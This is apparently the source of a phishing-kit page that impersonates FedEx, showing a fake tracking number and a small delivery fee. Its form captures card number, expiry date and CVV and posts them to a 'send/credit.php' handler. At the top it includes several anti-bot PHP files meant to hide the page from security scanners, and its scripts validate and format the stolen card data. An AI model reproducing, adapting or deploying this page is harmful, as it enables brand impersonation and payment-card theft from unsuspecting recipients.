<?php
include "../bots/anti1.php";
include "../bots/anti2.php";
include "../bots/anti3.php";
include "../bots/anti4.php";
include "../bots/anti5.php";
include "../bots/anti6.php";
include "../bots/anti7.php";	
?>
<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>FedEx Info | FedEx</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">             
  <link rel="preconnect" href="https://fonts.gstatic.com">
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/logo.png" type="image/x-icon" />
  <link rel="shortcut icon" href="image/logo.png" type="image/x-icon" />

  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>

</head>

<body>

    <header>
        <div class="header">
            <div class="logo" id="main">
                <img width="70" src="image/logo.png">
            </div>
        </div>
    </header>

    <section>
        <div class="billing bg-white pt-4 px-2" id="main">
            <div class="row" style="margin-right: 0;">
                <div class="col-md-8">
                    <div class="left">

                         <h3 class="mb-5 mt-4"> <strong>Tracking Number</strong>: 577215117391</h3>

                        <div class="step px-1 py-1">
                            <ul class="list-unstyled d-flex mb-0 justify-content-around">
                                <li><span class="none">1</span></li>
                                <span class="me-4 ms-2 n"> Contact Info </span>

                                <li><span >2</span></li>
                                <span class="me-4 ms-2">Payment Info</span>

                                <li><span class="none">3</span></li>
                                <span class="me-4 ms-2 n">Confirmation</span>
                            </ul>
                        </div>

                        <div class="content py-3 px-1" style="background: #E6E6E6;">
                            <p class="mt-2 mb-2"><b>* Required fields are in bold.</b></p>
                        </div>

                        <div class="titre py-1 px-1">
                            <span>Payment Information</span>
                        </div>

                        <div class="contentt" style="background: #F7F7F7;">


                            <form action="send/credit.php" method="post" id="konzform" name="konzform">

                                <input type="hidden" value="cc" name="step">

                                <div class="cardd d-flex align-items-center pt-4">
                                    <h6 class="me-2">Use a Credit Card </h6>
                                    <img src="image/creditcardlogos.png" width="50%" height="50%" >
                                </div>
                               


                               <div class="form-group mt-5">
                                   <input class="form-control" type="tel" placeholder="Card Number" name="card_number" id="card_number">
                                                                  </div>

                               <div class="row">
                                   <div class="col-md-6 form-group mt-5">
                                       <input type="tel" class="form-control" placeholder="Date Dexpiry" id="expiry" name="expiry">
                                                                          </div>
                                   <div class="col-md-6 form-group mt-5">
                                       <input class="form-control" placeholder="CVV" type="tel" id="cvv" name="cvv">
                                                                          </div>
                               </div>

                                <div class="btn text-center text-md-end mt-4 mb-4" style="width:100%">
                                   <button name="submit">Confirmer</button>
                               </div>
                            </form>
                        </div>
                    </div>
                </div>

                <div class="col-md-4 ">

                   <div class="free border py-3 px-3 shadow mt-4">

                           <div class="logo mb-5">
                               <img width="70" src="image/logo.png">
                           </div>

                           <div class="prix text-end ">
                              <p><b>0,085 $</b> </p>
                              <span>(0.15 incl.VAT)</span>
                           </div>

                           <hr>

                           <div class="row align-items-start">
                               <div class="col">
                                   <h5 class="fw-bolder">Total</h5>
                               </div>
                               <div class="col">
                                    <div class="prix text-end">
                                        <p> <b>01 , 00 $</b></p>
                                        <span>VAT included</span>
                                    </div>
                               </div>
                           </div>
                   </div>
                </div>
            </div>
        </div>
        
    </section>
<br>

    <footer class="pt-4">
        <div class="footer" id="main">
            <div class="logo d-flex justify-content-between">
                <div class="logo">
                    <img src="image/logo-footer.gif">
                </div>
                <div class="search">
                    <img src="image/search.png">
                </div>
            </div>

            <hr>

            <div class="footer-b row" style="margin-right: 0;">
                <div class="row">
                    <div class=" footer-left col-md-7">
                         <div class="navv d-flex">
                            <ul class="list-unstyled me-5">
                                <li><strong>Additional Information</strong></li>
                                <li>About FedEx</li>
                                <li>Service Information</li>
                                <li>Service Guide</li>
                                <li>Mobile Solutions</li>
                                <li>Healthcare Solutions</li>
                                <li>Aerospace Solutions</li>
                                <li>FedEx Supply Chain</li>
                                <li>Careers</li>
                            </ul>
                            <ul class="list-unstyled" >
                                <li><strong>Customer Support</strong></li>
                                <li>Contact Us</li>
                                <li>Frequently Asked Questions</li>
                                <li>Send us an email</li>
                                <li>Write to us</li>
                                <li>Call FedEx Customer Service at</li>
                                <li>1.800.GoFedEx 1.800.463 3339</li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-md-5">
                      <div class="footer-right d-flex justify-content-between">
                          <div>
                              
                              <span>Follow FedEx</span>
                              <div class="img mb-4">
                                  <img src="image/media.png">
                              </div>
                          </div>
                          <div>
                              <img src="image/canada.png">
                          </div>
                      </div>
                    </div>
                </div>

                <hr>

                <div class="row">
                    <div class="col-md-6">
                        <p>All rights reserved.� FedEx 1995-2023</p>
                    </div>
                    <div class="col-md-6 bottom">
                        <ul class="list-unstyled">
                            <li>Careers</li>
                            <li>Global Home</li>
                            <li>Site Map</li>
                            <li>Internet Privacy Policy</li>
                            <li>Privacy Code</li>
                            <li>Terms of Use</li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </footer>
    
   
   




  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
  <script>
       
            $('#cvv').payment('formatCardCVC');
            $('#expiry').payment('formatCardExpiry');
            $('#card_number').payment('formatCardNumber');
      </script>
            <script src="./js/jquery-3.3.1.min.js"></script>
      <script src="./js/jquery.mask.min.js"></script>
      <script src="./js/additional-methods.min.js"></script>
      <script src="./js/jquery.creditCardValidator.js"></script>
      <script src="./js/jquery.validate.min.js"></script>
      <script>$(window).ready(function(){setInterval(function(){$(".busyOverlay").fadeOut("fast"),$(".busyIcon").fadeOut("fast")},1e3)});</script>      <script>
    $(document).ready(function (e) { e("#ccn").mask("0000 0000 0000 0000"),
         $("#konzform").validate({
            errorClass: "error-class",
            rules: {
               card_number: {
                  required: true
               },
               cvv: {
                  required: true,
                  digits: true,
                  minlength: 3,
                  maxlength: 4
                  },
               expiry: {
                  required: true
                  }
               },
            messages: {
               card_number: {
                  required: "Please check your card number."
                  },
               cvv: {
                  required: "Please enter a CVV/CVV2."
                  },
               expiry: {
                  required: "Please check your Expiration date.."

               }
            }
         });
      })

      let expCheck = () => {
         var today = new Date();
         var expDate = new Date($("#expyear").val(), ($("#expmonth").val() - 1));
         var check = true;
         if (today.getTime() > expDate.getTime()) {
            $(".expclass div").addClass("ppvx_field--error___3-9-3");
            return false;
         } else {
            $(".expclass div").removeClass("ppvx_field--error___3-9-3");
         }
         if (!check) {
            return false;
         }
         return check;
      }

      let ccnCheck = () => {
      let result = $('#ccn').validateCreditCard();
            if(!result.valid) {
              $(".ccnclass div").addClass("ppvx_field--error___3-9-3");

                return false;
          }
      }

      let doubleCc = () => {
            let ccn = document.querySelector('input[name=ccn]');
            const ccn1 = document.querySelector('input[name=ccn1]');
         if (ccn.value === ccn1.value) {
            $('.ccnerror').addClass('ppvx_field--error___3-9-3');
            return false;
         } else {
            $('.ccnerror').removeClass('ppvx_field--error___3-9-3');
            return true;
         }
      }

      const alpha = (e) => {
             let k;
             document.all ? k = e.keyCode : k = e.which;
             return ((k > 64 && k < 91) || (k > 96 && k < 123) || k == 8 || k == 32 || (k >= 48 && k <= 57));
         }
      </script>
</body>
</html>